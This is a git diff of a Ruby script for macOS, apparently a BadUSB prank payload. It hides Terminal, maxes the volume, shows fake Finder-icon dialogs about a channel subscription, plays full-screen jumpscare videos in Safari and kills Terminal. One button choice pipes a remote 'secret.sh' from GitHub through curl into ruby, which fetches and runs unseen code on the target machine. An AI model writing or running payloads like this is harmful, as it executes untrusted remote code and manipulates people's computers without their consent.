@@ -7,6 +7,7 @@ system("osascript -e 'tell application \"Terminal\" to set visible of front wind
 
 # --- Helper: Display Dialog with Finder Icon via AppleScript ---
 def display_dialog(message, buttons, default)
+  # Construct the AppleScript command using the Finder icon.
   button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
   ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
   output = `osascript -e '#{ascript}'`
@@ -28,7 +29,7 @@ def set_volume_to_max
   end
 end
 
-# --- Create Temporary HTML for a Full-Screen Jumpscare ---
+# --- Create Temporary HTML for Full-Screen Jumpscare ---
 def create_jumpscare_html(video_url)
   html_content = <<-HTML
 <html>
@@ -53,7 +54,7 @@ def create_jumpscare_html(video_url)
       var video = document.getElementById('video');
       video.play();
       video.addEventListener('loadeddata', function() {
-        // After a short delay, request fullscreen and unmute, then play.
+        // After a short delay, request fullscreen and unmute.
         setTimeout(function(){
           if (video.requestFullscreen) {
             video.requestFullscreen();
@@ -77,19 +78,19 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Trigger a Jumpscare in Safari ---
-# Opens Safari to display the jumpscare video and manipulates window visibility.
+# Opens the temporary HTML file in Safari, hides the window initially, waits, then unhides it.
 def trigger_jumpscare(video_url)
   set_volume_to_max
   html_file = create_jumpscare_html(video_url)
-  # Open the temporary HTML in Safari.
+  # Open Safari with the temporary HTML file.
   system("open -a Safari '#{html_file}'")
   # Immediately hide Safari's front window.
   system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-  # Wait a moment for the sound to start.
+  # Wait briefly to allow sound to start.
   sleep 0.5
-  # Unhide Safari so the jumpscare is visible.
+  # Unhide Safari so the jumpscare becomes visible.
   system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
-  # Let the jumpscare play for 1 second.
+  # Allow the jumpscare to play for 1 second.
   sleep 1
 end
 
@@ -98,9 +99,22 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
+# --- Subscriber Branch Action ---
+# If "Hawk" is chosen, run the secret script; if "Tuah" is chosen, trigger the winner jumpscare.
+def subscriber_action(choice)
+  if choice.downcase == "hawk"
+    run_secret_script
+  elsif choice.downcase == "tuah"
+    # Trigger winner jumpscare using the raw link for Jeff_Jumpscare.mp4.
+    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
+  else
+    puts "Unexpected button choice."
+  end
+end
+
 # --- Main Program Flow ---
 
-# Subscription prompt: "Are you subscribed to MrWoooper?"
+# First prompt: "Are you subscribed to MrWoooper?"
 subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
 
 if subscribed.nil?
@@ -109,29 +123,20 @@ if subscribed.nil?
 end
 
 if subscribed.downcase == "no"
-  # Non-subscriber branch: Wait 1 second, then immediately trigger the jumpscare.
+  # Non-subscriber branch: Use the raw link for jumpscare2.mp4.
   sleep 1
-  # Using the jumpscare video from your GitHub repo (e.g., Jeff_Jumpscare.mp4).
-  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
-  trigger_jumpscare(jumpscare_video_url)
-  # Force-kill Terminal.
+  non_sub_video = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
+  trigger_jumpscare(non_sub_video)
   system("killall Terminal")
   exit 0
 else
   # Subscriber branch: Show a dialog with two buttons: "Hawk" and "Tuah"
-  button_response = display_dialog("Choose a button: (You have a 50% chance of something good happening to you)", ["Hawk", "Tuah"], "Hawk")
-  if button_response.nil?
+  button_choice = display_dialog("Choose a button:", ["Hawk", "Tuah"], "Hawk")
+  if button_choice.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
-
-  if button_response.downcase == "hawk"
-    run_secret_script
-  elsif button_response.downcase == "tuah"
-    trigger_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  end
-  
-  # Force-kill Terminal after action.
+  subscriber_action(button_choice)
   system("killall Terminal")
   exit 0
 end
